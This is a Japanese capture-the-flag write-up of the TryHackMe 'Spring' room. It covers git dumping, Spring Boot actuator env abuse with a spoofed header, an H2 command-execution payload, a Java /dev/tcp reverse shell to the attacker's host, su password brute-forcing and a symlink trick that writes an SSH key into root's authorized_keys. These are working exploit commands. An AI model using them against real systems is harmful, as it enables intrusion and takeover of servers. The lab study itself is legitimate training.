# Spring CTF

https://tryhackme.com/room/spring

## Enumeration

```shell
TARGET=10.49.191.189
sudo bash -c "echo $TARGET   spring.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 64
80/tcp  open  http    syn-ack ttl 64
443/tcp open  https   syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,443 $TARGET

PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http
443/tcp open  ssl/https
```

SSH, HTTP(S)

証明書

```
CN = John Smith
OU = Unknown
O = spring.thm
L = Unknown
ST = Unknown
C = Unknown
```

### サブドメイン、VHOST

11万件のリストでファジングしたが、ヒットしなかった。

```shell
ffuf -u https://spring.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.spring.thm' -fs 13
```

### ディレクトリ列挙

logout, sources を発見したが、302

```sh
dirb https://spring.thm/

---- Scanning URL: https://spring.thm/ ----
+ https://spring.thm/logout (CODE:302|SIZE:0)                                                                                             
+ https://spring.thm/sources (CODE:302|SIZE:0) 
```

/sources/ の中を dirsearch して、/new を発見

```sh
[01:29:07] 302 -    0B  - /sources/new  ->  /sources/new/
```

/sources/new の中で、git を発見。

```sh
root@ip-10-49-100-164:~# dirsearch -u https://spring.thm/sources/new/ -e java,php,py,txt

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: java, php, py, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10967

Output File: /root/reports/https_spring.thm/_sources_new__26-03-06_01-30-36.txt

Target: https://spring.thm/

[01:30:36] Starting: sources/new/
[01:30:37] 302 -    0B  - /sources/new/.git  ->  /sources/new/.git/
[01:30:37] 200 -  401B  - /sources/new/.git/COMMIT_EDITMSG
[01:30:37] 200 -  148B  - /sources/new/.git/config
[01:30:37] 200 -   73B  - /sources/new/.git/description
[01:30:37] 302 -    0B  - /sources/new/.git/logs/refs  ->  /sources/new/.git/logs/refs/
[01:30:37] 200 -   23B  - /sources/new/.git/HEAD
[01:30:37] 302 -    0B  - /sources/new/.git/logs/refs/heads  ->  /sources/new/.git/logs/refs/heads/
[01:30:37] 200 -  319B  - /sources/new/.git/logs/HEAD
[01:30:37] 302 -    0B  - /sources/new/.git/refs/heads  ->  /sources/new/.git/refs/heads/
[01:30:37] 200 -  319B  - /sources/new/.git/logs/refs/heads/master
[01:30:38] 200 -  240B  - /sources/new/.git/info/exclude
[01:30:38] 302 -    0B  - /sources/new/.git/refs/tags  ->  /sources/new/.git/refs/tags/
[01:30:38] 200 -   41B  - /sources/new/.git/refs/heads/master
[01:30:38] 200 -    1KB - /sources/new/.git/index
[01:30:38] 200 -  355B  - /sources/new/.gitignore
[01:30:42] 400 -  435B  - /sources/new/\..\..\..\..\..\..\..\..\..\etc\passwd
[01:30:43] 400 -  435B  - /sources/new/a%5c.aspx

Task Completed
```

## git

ローカルにダンプ

```sh
$ /home/kali/tools/GitTools/Dumper/gitdumper.sh https://spring.thm/sources/new/.git/ ./git
```

Extract

```sh
$ /home/kali/tools/GitTools/Extractor/extractor.sh . Spring
```

2コミット含まれている。

```sh
$ ls -al
total 16
drwxrwxr-x 4 kali kali 4096 Mar  6 10:34 .
drwxrwxr-x 4 kali kali 4096 Mar  6 10:34 ..
drwxrwxr-x 4 kali kali 4096 Mar  6 10:34 0-92b433a86a015517f746a3437ba3802be9146722
drwxrwxr-x 4 kali kali 4096 Mar  6 10:34 1-1a83ec34bf5ab3a89096346c46f6fda2d26da7e6

$ ls ./0-92b433a86a015517f746a3437ba3802be9146722 
build.gradle  commit-meta.txt  gradle  gradlew  gradlew.bat  settings.gradle  src

$ cat ./*/commit-meta.txt  
tree 6bd070178569781eb0534f575e52157aa59a501e
author John Smith <johnsmith@spring.thm> 1593906805 +0000
committer John Smith <johnsmith@spring.thm> 1593906805 +0000

Hello world
tree 39858db3349ea85bfc5b0120dc5d2ca45f0683af
parent 92b433a86a015517f746a3437ba3802be9146722
author John Smith <johnsmith@spring.thm> 1594404835 +0000
committer John Smith <johnsmith@spring.thm> 1594404835 +0000

added greeting
changed security password to my usual format
```

パスワード変更の部分

```sh
$ diff ./0-92b433a86a015517f746a3437ba3802be9146722/src/main/resources/application.properties ./1-1a83ec34bf5ab3a89096346c46f6fda2d26da7e6/src/main/resources/application.properties
15c15
< spring.security.user.password=idontwannag0
---
> spring.security.user.password=PrettyS3cureSpringPassword123.
```

コード変更の部分

```sh
$ diff ./0-92b433a86a015517f746a3437ba3802be9146722/src/main/java/com/onurshin/spring/Application.java ./1-1a83ec34bf5ab3a89096346c46f6fda2d26da7e6/src/main/java/com/onurshin/spring/Application.java
20a21
> import org.springframework.web.bind.annotation.RequestParam;
30a32
>     //https://spring.io/guides/gs/rest-service/
33,34c35,37
<         public String hello() {
<             return "Hello WORLD";
---
>         public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
>             System.out.println(name);
>             return String.format("Hello, %s!", name);
60,61d62
< 
<                 System.out.println(context.findChild("default"));
```

SSTIを試したが、400BadRequestが返るので無理と判断。

application.properties 

```sh
$ cat ./1-1a83ec34bf5ab3a89096346c46f6fda2d26da7e6/src/main/resources/application.properties 
server.port=443
server.ssl.key-store=classpath:dummycert.p12
server.ssl.key-store-password=DummyKeystorePassword123.
server.ssl.keyStoreType=PKCS12
management.endpoints.enabled-by-default=true
management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart
management.endpoint.env.keys-to-sanitize=
server.forward-headers-strategy=native
server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04
server.error.whitelabel.enabled=false
spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration
server.servlet.register-default-servlet=true
spring.mvc.ignore-default-model-on-redirect=true
spring.security.user.name=johnsmith
spring.security.user.password=PrettyS3cureSpringPassword123.
debug=false
spring.cloud.config.uri=
spring.cloud.config.allow-override=true
management.endpoint.heapdump.enabled=false
spring.resources.static-locations=classpath:/META-INF/resources/, classpath:/resources/, classpath:/static/, classpath:/public/
```

`x-9ad42dea0356cb04: 172.16.0.1` ヘッダーを付けて https://spring.thm/actuator/env をリクエストしたら応答があった。

```json
...
"sun.java.command": {
    "value": "/opt/spring/sources/new/spring-0.0.1-SNAPSHOT.jar --server.ssl.key-store=/opt/privcert.p12 --server.ssl.key-store-password=PrettyS3cureKeystorePassword123."
},
...
```

application.properties では `DummyKeystorePassword123.` と設定されていたが、実際には `PrettyS3cureKeystorePassword123.` が使用されていたことが分かった。

つまり、`my usual format` とは次の形式になると思われる。

```
PrettyS3cureSpringPassword123.
PrettyS3cureKeystorePassword123.

パターン
PrettyS3cure*********Password123.
```

SSHのパスワードを推測する。こういう形か？

```
PrettyS3cureSSHPassword123.
PrettyS3cureSshPassword123.
PrettyS3curesshPassword123.
```

パスワードによるSSH接続は不可だった。

```sh
$ hydra -l john -P ./pass.txt $TARGET ssh -t 30 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 11:36:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5), ~1 try per task
[DATA] attacking ssh://10.49.191.189:22/
[ERROR] target ssh://10.49.191.189:22/ does not support password authentication (method reply 4).
```

overrideが可能な設定になっている。

```
spring.cloud.config.allow-override=true
```

env の書き換えを狙う。

```sh
$ curl -X POST -H "x-9ad42dea0356cb04: 172.16.0.1" \
     -H "Content-Type: application/json" \
     -d '{"name":"spring.cloud.bootstrap.location","value":"http://192.168.129.39:8000/exploit.yml"}' \
     -k https://spring.thm/actuator/env
{"spring.cloud.bootstrap.location":"http://192.168.129.39:8000/exploit.yml"}
```

書き換えは成功。

```sh
$ curl -H "x-9ad42dea0356cb04: 172.16.0.1" -k https://spring.thm/actuator/env

{
    "activeProfiles": [],
    "propertySources": [
        {
            "name": "manager",
            "properties": {
                "spring.cloud.bootstrap.location": {
                    "value": "http://192.168.129.39:8000/exploit.yml"
                }
            }
        },
```

エクスプロイト

```sh
$ cat ./Exploit.java                                                          
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.129.39/8888 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

$ javac ./Exploit.java
```

```sh
$ cat exploit.yml                                   
!!java.net.URLClassLoader
- [ "http://192.168.129.39:8000/" ]
```

```sh
mkdir -p META-INF/services
echo 'Exploit' > META-INF/services/javax.script.ScriptEngineFactory
```

```sh
$ curl -X POST -H "x-9ad42dea0356cb04: 172.16.0.1" \
     -H "Content-Type: application/json" \
     -d '{"name":"spring.cloud.bootstrap.location","value":"http://192.168.129.39:8000/exploit.yml"}' \
     -k https://spring.thm/actuator/env

$ curl -X POST -H "x-9ad42dea0356cb04: 172.16.0.1" -k https://spring.thm/actuator/restart
{"message":"Restarting"}
```

exploit.yml の後に META-INF/services/javax.script.ScriptEngineFactory へのリクエストが来ることを想定していたが、来ない。

```sh
$ python -m http.server                                                                    
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.49.191.189 - - [06/Mar/2026 12:03:49] "HEAD /exploit.yml HTTP/1.1" 200 -
10.49.191.189 - - [06/Mar/2026 12:03:49] "GET /exploit.yml HTTP/1.1" 200 -
```

内容を変更。`name: exploit` の部分が重要。

```sh
$ cat bootstrap.yml                                                                     
spring:
  cloud:
    config:
      enabled: true
      uri: http://192.168.129.39:8000
      name: exploit
      profile: default

$ curl -X POST -H "x-9ad42dea0356cb04: 172.16.0.1" -k https://spring.thm/actuator/restart
{"message":"Restarting"}
```

/exploit/default へのリクエストが来た。が、次の手が分からくなった。

```sh
10.48.181.107 - - [06/Mar/2026 14:13:41] "HEAD /bootstrap.yml HTTP/1.1" 200 -
10.48.181.107 - - [06/Mar/2026 14:13:41] "GET /bootstrap.yml HTTP/1.1" 200 -
10.48.181.107 - - [06/Mar/2026 14:13:42] "HEAD /bootstrap.yml HTTP/1.1" 200 -
10.48.181.107 - - [06/Mar/2026 14:13:42] "HEAD /bootstrap.yml HTTP/1.1" 200 -
10.48.181.107 - - [06/Mar/2026 14:13:43] code 404, message File not found
10.48.181.107 - - [06/Mar/2026 14:13:43] "GET /exploit/default HTTP/1.1" 404 -
```

beans と env を見る限りH2が使われている可能性が高いと思うので、このエクスプロイトを試す。

https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/

```sh
curl -X POST \
  -H "x-9ad42dea0356cb04: 172.16.0.1" \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('\''String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new'\'','\'' java.util.Scanner(Runtime.getRun'\'','\''time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }'\'');CALL EXEC('\''curl http://192.168.129.39:8000/test'\'');"}' \
  -k https://spring.thm/actuator/env

curl -X POST -H "x-9ad42dea0356cb04: 172.16.0.1" -k https://spring.thm/actuator/restart
```

リクエストが来た！（リスタートがトリガーになることに注意）

```sh
10.48.181.107 - - [06/Mar/2026 14:36:47] "GET /test HTTP/1.1" 404 -
```

busybox でリバースシェルを取れた。

```sh
nobody@spring:/$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

フラグ１発見。

```sh
nobody@spring:/$ ls -al /opt
total 20
drwxr-xr-x  3 root root 4096 Jul 10  2020 .
drwxr-xr-x 24 root root 4096 Jul  3  2020 ..
-rw-r--r--  1 root root   34 Jul 10  2020 foothold.txt
-rw-r--r--  1 root root 2597 Jul  4  2020 privcert.p12
drwxr-xr-x  3 root root 4096 Jul 10  2020 spring
```

## 権限昇格１

johnsmith への昇格が必要。

```sh
nobody@spring:/home/johnsmith$ ls -al
total 44
drwxr-xr-x 7 johnsmith johnsmith 4096 Jul 10  2020 .
drwxr-xr-x 3 root      root      4096 Jun 28  2020 ..
lrwxrwxrwx 1 johnsmith johnsmith    9 Jul 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 johnsmith johnsmith  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 johnsmith johnsmith 3771 Apr  4  2018 .bashrc
drwx------ 2 johnsmith johnsmith 4096 Jul 10  2020 .cache
drwx------ 3 johnsmith johnsmith 4096 Jun 28  2020 .gnupg
drwxrwxr-x 3 johnsmith johnsmith 4096 Jul 10  2020 .local
-rw-r--r-- 1 johnsmith johnsmith  807 Apr  4  2018 .profile
drwx------ 2 johnsmith johnsmith 4096 Jul 10  2020 .ssh
drwxrwxr-x 2 johnsmith johnsmith 4096 Mar  6 04:53 tomcatlogs
-r-------- 1 johnsmith johnsmith   34 Jul 10  2020 user.txt
```

パスワード推測が必要か？下記のパスワードはダメだった。

```
idontwannag0
PrettyS3cureSshPassword123.
PrettyS3cureSuPassword123.
PrettyS3cureShellPassword123.
PrettyS3curePassword123.
```

sucrack するしかないんだろうけど具体的にどうするのよという感じだったので[ウォークスルー](https://gist.github.com/10urshin/b88cfcd2f0ff49e343dfbc44cc89ebdb)を見た。

rockyouから1文字目大文字で後全部小文字の単語を抜き出している。

```sh
$ cat /usr/share/wordlists/rockyou.txt | grep -E ^[A-Z][a-z]+$ > capitalized_words.txt
wc -l capitalized_words.txt
89652 capitalized_words.txt
```

ターゲットにsucrackをインストールするより便利そうなのでスクリプトも拝借した。  

```sh
nobody@spring:/tmp$ ./su_bruteforce.sh ./words.txt 
Creds Found! johnsmith:PrettyS3cure[REDACTED]Password123.7%
Password: 
uid=1000(johnsmith) gid=1000(johnsmith) groups=1000(johnsmith)
Cracking : [##--------------------------------------] 7%Killed
```

昇格。

```sh
nobody@spring:/tmp$ su johnsmith
Password: 
johnsmith@spring:/tmp$
```

残念ながらSSH秘密鍵は置かれていなかった。

## 権限昇格２

springサービス

```sh
johnsmith@spring:~$ systemctl cat spring.service
# /etc/systemd/system/spring.service
[Unit]
Description=Spring Boot Application
After=syslog.target
StartLimitIntervalSec=0

[Service]
User=root10.48.130.192
Restart=always
RestartSec=1
ExecStart=/root/start_tomcat.sh

[Install]
WantedBy=multi-user.target
```

不自然に置かれているtomcatログ。

```sh
johnsmith@spring:~/tomcatlogs$ ls -al
total 240
drwxrwxr-x 2 johnsmith johnsmith   4096 Mar  6 04:53 .
drwxr-xr-x 8 johnsmith johnsmith   4096 Mar  6 07:18 ..
-rw-r--r-- 1 root      root        6928 Jul 10  2020 1594410148.log
-rw-r--r-- 1 root      root        6728 Jul 10  2020 1594410465.log
-rw-r--r-- 1 root      root        5237 Jul 10  2020 1594413491.log
-rw-r--r-- 1 root      root        7194 Jul 12  2020 1594552377.log
-rw-r--r-- 1 root      root        6990 Jul 12  2020 1594574751.log
-rw-r--r-- 1 root      root        7429 Jul 12  2020 1594575333.log
-rw-r--r-- 1 root      root        7182 Jul 12  2020 1594576008.log
-rw-r--r-- 1 root      root        6725 Jul 12  2020 1594584453.log
-rw-r--r-- 1 root      root      167179 Mar  6 05:43 1772772793.log
```

1772772793 は epoch で Fri 6 March 2026 04:53:13 UTC なので、ログファイル名は予測可能。

こういうログが繰り返し出ている。新しいログファイルに切り替わるトリガーにアクセスできるのかが不明。

```sh
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.3.1.RELEASE)

2026-03-06 05:39:43.146  WARN 924 --- [    Thread-2292] c.c.c.ConfigServicePropertySourceLocator : Could not locate PropertySource: label not found
2026-03-06 05:39:43.152  WARN 924 --- [    Thread-2292] c.c.c.ConfigServicePropertySourceLocator : Could not locate PropertySource: label not found
2026-03-06 05:39:43.162  INFO 924 --- [    Thread-2292] c.c.c.ConfigServicePropertySourceLocator : Fetching config from server at : http://192.168.129.39:8000
...
```

削除することが可能。

```sh
johnsmith@spring:~/tomcatlogs$ rm -f ./1772772793.log 
johnsmith@spring:~/tomcatlogs$ ls -al
total 72
drwxrwxr-x 2 johnsmith johnsmith 4096 Mar  6 07:55 .
drwxr-xr-x 8 johnsmith johnsmith 4096 Mar  6 07:18 ..
-rw-r--r-- 1 root      root      6928 Jul 10  2020 1594410148.log
-rw-r--r-- 1 root      root      6728 Jul 10  2020 1594410465.log
-rw-r--r-- 1 root      root      5237 Jul 10  2020 1594413491.log
-rw-r--r-- 1 root      root      7194 Jul 12  2020 1594552377.log
-rw-r--r-- 1 root      root      6990 Jul 12  2020 1594574751.log
-rw-r--r-- 1 root      root      7429 Jul 12  2020 1594575333.log
-rw-r--r-- 1 root      root      7182 Jul 12  2020 1594576008.log
-rw-r--r-- 1 root      root      6725 Jul 12  2020 1594584453.log
```

tee でログファイルを出力している。これはrootユーザーとして。

```sh
johnsmith@spring:~/tomcatlogs$ systemctl status spring.service
● spring.service - Spring Boot Application
   Loaded: loaded (/etc/systemd/system/spring.service; enabled; vendor preset: enabled)
   Active: active (running) since Fri 2026-03-06 04:53:13 UTC; 3h 8min ago
 Main PID: 785
    Tasks: 3 (limit: 1079)
   CGroup: /system.slice/spring.service
           ├─785 /bin/bash /root/start_tomcat.sh
           ├─819 sudo su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -Djava.security.egd=file:///dev/urandom -jar /opt/spring/sources/new/spring-0.0.1-SNAPSHOT.jar --server.ssl.key-store=/opt/privcert.p12 --ser
           └─821 tee /home/johnsmith/tomcatlogs/1772772793.log

Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.
```

ノイズが多すぎて /etc/passwd や /etc/shadow への書き込みは現実的ではない。  
/root/.ssh/authorized_keys への書き込みを目指す。

System.out.println() で名前を出力しているので、名前として公開鍵をセットすれば成功することが見込める。

```java
    @RestController
    //https://spring.io/guides/gs/rest-service/
    static class HelloWorldController {
        @RequestMapping("/")
        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
            System.out.println(name);
            return String.format("Hello, %s!", name);
        }
    }
```

現在時刻から60秒分のシンボリックリンクを作成

```sh
start_time=$(date +%s)
for i in {0..59}; do
    target=$((start_time + i))
    ln -s /root/.ssh/authorized_keys "${target}.log"
done
```

```sh
johnsmith@spring:~/tomcatlogs$ ls -al
total 172
drwxrwxr-x 2 johnsmith johnsmith  4096 Mar  7 00:10 .
drwxr-xr-x 7 johnsmith johnsmith  4096 Jul 10  2020 ..
-rw-r--r-- 1 root      root       6928 Jul 10  2020 1594410148.log
-rw-r--r-- 1 root      root       6728 Jul 10  2020 1594410465.log
-rw-r--r-- 1 root      root       5237 Jul 10  2020 1594413491.log
-rw-r--r-- 1 root      root       7194 Jul 12  2020 1594552377.log
-rw-r--r-- 1 root      root       6990 Jul 12  2020 1594574751.log
-rw-r--r-- 1 root      root       7429 Jul 12  2020 1594575333.log
-rw-r--r-- 1 root      root       7182 Jul 12  2020 1594576008.log
-rw-r--r-- 1 root      root       6725 Jul 12  2020 1594584453.log
-rw-r--r-- 1 root      root      88101 Mar  7 00:08 1772841344.log
-rw-r--r-- 1 root      root       8221 Mar  7 00:10 1772842136.log
lrwxrwxrwx 1 johnsmith johnsmith    26 Mar  7 00:10 1772842227.log -> /root/.ssh/authorized_keys
lrwxrwxrwx 1 johnsmith johnsmith    26 Mar  7 00:10 1772842228.log -> /root/.ssh/authorized_keys
lrwxrwxrwx 1 johnsmith johnsmith    26 Mar  7 00:10 1772842229.log -> /root/.ssh/authorized_keys
...
```

シャットダウンを利用してログファイルを切り替える。

```sh
curl -X POST -H "x-9ad42dea0356cb04: 172.16.0.1" -k https://spring.thm/actuator/shutdown
```

公開鍵をログ出力させる。

```sh
curl -X POST -H "x-9ad42dea0356cb04: 172.16.0.1" -k https://spring.thm/?name=ssh-rsa%20AAAAB3NzaC1yc2EAAAADAQABAAABgQCwgKNb/dxCOgRCw7lNR0dH9hOIBX1Q0UaLXQeAyM7Q3Yx7jt1ajGj8rX9A7xvm3IFZgvzCMvknA6ZYjum0qLHPoFgdwYlsB/5jp1fCJO+KpIcwQh4gUP6o5CDvcwJ5Ax6fSe/Gzra3QLRlKgJjbqLF/Ez3kIKLYSBxiPg2cNCHamzABoOnishbrQQ94GDxkJ6tEckAmHVt4lJSCD/7Rlo8Jn8BQ42uZIGKonyhfBEFuIWIkfDNNFIMhSLvSOKz7AMvBi5VZWfRV86jJlA+FTy4PFM2I5LxFI70ARyFEaEbQBt4EsDbxzN7nnNvirYcceX1mnQZRQN4nrt5cH5mEnvHK7p67AK/pb6HZaklzYcDP0Zz4PPpvGIOOu0f0wO2D5fjM2JuI8IYGIX7TYTCge+q3qyKrm+J4bcFfsHs1vGee5fNM9ndgDnntRfbJOE8La9vHOfVCMt8D5vl4gr0/ibsiV5rHOUssWHlwp6bbICHM/LBEbot8HnwD2Twtt5RWJ8=%20kali@kali
```

しかし接続できなかった。

```sh
$ ssh root@$TARGET -i ./id_rsa                                                            
root@10.48.165.20: Permission denied (publickey).
```

公開鍵の中の `+` がURLエンコードとして扱われスペースに化けていたのが原因。パラメータとして送る。

```sh
$ curl -X POST -H "x-9ad42dea0356cb04: 172.16.0.1" -k https://spring.thm/ --data-urlencode "name=ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwgKNb/dxCOgRCw7lNR0dH9hOIBX1Q0UaLXQeAyM7Q3Yx7jt1ajGj8rX9A7xvm3IFZgvzCMvknA6ZYjum0qLHPoFgdwYlsB/5jp1fCJO+KpIcwQh4gUP6o5CDvcwJ5Ax6fSe/Gzra3QLRlKgJjbqLF/Ez3kIKLYSBxiPg2cNCHamzABoOnishbrQQ94GDxkJ6tEckAmHVt4lJSCD/7Rlo8Jn8BQ42uZIGKonyhfBEFuIWIkfDNNFIMhSLvSOKz7AMvBi5VZWfRV86jJlA+FTy4PFM2I5LxFI70ARyFEaEbQBt4EsDbxzN7nnNvirYcceX1mnQZRQN4nrt5cH5mEnvHK7p67AK/pb6HZaklzYcDP0Zz4PPpvGIOOu0f0wO2D5fjM2JuI8IYGIX7TYTCge+q3qyKrm+J4bcFfsHs1vGee5fNM9ndgDnntRfbJOE8La9vHOfVCMt8D5vl4gr0/ibsiV5rHOUssWHlwp6bbICHM/LBEbot8HnwD2Twtt5RWJ8= kali@kali"
```

成功！

```sh
$ ssh root@$TARGET -i ./id_rsa 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)
...
root@spring:~# 
```

## 振り返り

- Spring の actuator は良い知識を得た。
- sucrack を使うのは面倒なので、これからも今回拝借したスクリプトを使わせてもらうことにする。
- authorized_keys に無効な行が大量に入っても、その中から有効な行をくみ取ってくれると知れたのは良い学びだった。

## Tags

#tags:Spring #tags:sucrack
